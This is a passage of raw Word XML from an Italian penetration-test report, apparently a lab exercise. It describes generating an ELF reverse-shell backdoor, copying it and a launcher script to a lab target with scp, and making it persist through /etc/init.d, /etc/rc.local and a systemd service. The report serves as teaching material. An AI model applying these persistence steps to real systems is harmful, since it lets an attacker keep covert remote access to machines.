      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> è il formato del payload (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Executable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Linkable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> Format);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F0BA363" w14:textId="283ED85A" w:rsidR="00301ADD" w:rsidRPr="00301ADD" w:rsidRDefault="00301ADD">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">-o </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>shell.elf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> salva il codice generato nel file che segue l’opzione -o</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B24A9CC" w14:textId="77777777" w:rsidR="00301ADD" w:rsidRDefault="00301ADD" w:rsidP="00301ADD"/>
    <w:p w14:paraId="33D66E84" w14:textId="48067789" w:rsidR="00054D0B" w:rsidRDefault="00301ADD" w:rsidP="00301ADD">
      <w:r w:rsidRPr="00301ADD">
        <w:t xml:space="preserve">In particolare, usiamo come payload una semplice reverse shell, si potrebbe utilizzare anche una shell </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00301ADD">
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00301ADD">
        <w:t xml:space="preserve"> che fornisce una shell interattiva dove si può interagire con più funzionalità con la macchina. In questo caso ci riferiamo all’utilizzo di </w:t>
      </w:r>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Exploit</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Locali</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00301ADD">
        <w:t xml:space="preserve"> cioè all’installazione locale sulla macchina target della backdoor. Successivamente è necessario creare uno script in modo tale che la backdoor </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00301ADD">
        <w:t>shell.elf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00301ADD">
        <w:t xml:space="preserve"> venga eseguita automaticamente a ogni esecuzione di questo, denominandolo "in.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76E8BBBE" w14:textId="096DC792" w:rsidR="00054D0B" w:rsidRDefault="00301ADD" w:rsidP="00054D0B">
      <w:r w:rsidRPr="001B613B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251738112" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2DDB2921" wp14:editId="538DD300">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>295910</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4008120" cy="495300"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapTopAndBottom/>
            <wp:docPr id="5366017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01772" name="Immagine 1" descr="Immagine che contiene testo, schermata, Carattere, linea&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId61"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4008120" cy="495300"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="611F99FA" w14:textId="1815A824" w:rsidR="001B613B" w:rsidRDefault="00301ADD" w:rsidP="00301ADD">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Figura 2</w:t>
      </w:r>
      <w:r w:rsidR="000172D7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="000172D7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>file in.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="268B76B6" w14:textId="77777777" w:rsidR="000172D7" w:rsidRDefault="000172D7" w:rsidP="000172D7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Dopodiché sono stati copiati sulla macchina target nella directory </w:t>
      </w:r>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>home/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>gandalf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">i file </w:t>
      </w:r>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">in.sh </w:t>
      </w:r>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>shell.elf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">utilizzando rispettivamente il comando </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>scp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> ./in.sh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>moss@10.0.2.4:/home/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>moss</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>scp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> ./</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>shell.elf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> moss@10.0.2.4:/home/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>moss</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15CA6BC7" w14:textId="1C668DFF" w:rsidR="00301ADD" w:rsidRDefault="000172D7" w:rsidP="000172D7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Dopo essersi spostati sulla macchina target, sfruttando le credenziali </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>ssh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> recuperate nelle fasi precedenti e avendo ottenuto la shell di root come descritto nella sezione </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>privilage</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> escalation</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">ono stati copiati entrambi i file nella directory </w:t>
      </w:r>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>init.d</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, dopodiché sono stati assegnati i permessi di esecuzione con il comando </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>chmod</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> +x in.sh </w:t>
      </w:r>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>chmod</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> +x </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>shell.elf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">. Per far in modo che il sistema esegui in automatico lo script </w:t>
      </w:r>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">in.sh </w:t>
      </w:r>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">bisogna creare il file </w:t>
      </w:r>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>rc.local</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>che contiene una serie di script che il sistema operativo esegue all’avvio.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC20FF5" w14:textId="77777777" w:rsidR="000172D7" w:rsidRPr="000172D7" w:rsidRDefault="000172D7" w:rsidP="000172D7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E839C03" w14:textId="120D7A2C" w:rsidR="000172D7" w:rsidRDefault="00E42311" w:rsidP="000172D7">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E42311">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2CE3EF37" wp14:editId="3F5CE1E7">
            <wp:extent cx="4968671" cy="693480"/>
            <wp:effectExtent l="0" t="0" r="3810" b="0"/>
            <wp:docPr id="14191034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03483" name="Immagine 1" descr="Immagine che contiene testo, schermata, Carattere, software&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId62"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4968671" cy="693480"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="000172D7" w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura </w:t>
      </w:r>
      <w:r w:rsidR="000172D7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>30</w:t>
      </w:r>
      <w:r w:rsidR="000172D7" w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="000172D7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">file </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="000172D7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>rc.local</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="76594D79" w14:textId="2EADEEEB" w:rsidR="000172D7" w:rsidRPr="000172D7" w:rsidRDefault="000172D7" w:rsidP="000172D7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Successivamente è necessario dare i permessi di esecuzione anche al file </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>rc.local</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">utilizzando il comando </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>chmod</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> +x /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>rc.local</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>. A questo punto è necessario abilitare lo script /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>rc.local</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> per l’esecuzione all’avvio del sistema, per fare ciò bisogna creare il file </w:t>
      </w:r>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>systemd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>/system/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>rclocal.service</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42820ED8" w14:textId="77777777" w:rsidR="000172D7" w:rsidRDefault="000172D7" w:rsidP="00054D0B"/>
    <w:p w14:paraId="74AC73B8" w14:textId="45B2215E" w:rsidR="001B613B" w:rsidRDefault="001B613B" w:rsidP="000172D7">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7D059147" wp14:editId="7C0723EE">
            <wp:extent cx="5269865" cy="2174240"/>
            <wp:effectExtent l="0" t="0" r="6985" b="0"/>
            <wp:docPr id="131722782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9865" cy="2174240"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="000172D7" w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura </w:t>
      </w:r>
      <w:r w:rsidR="000172D7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>31</w:t>
      </w:r>
      <w:r w:rsidR="000172D7" w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
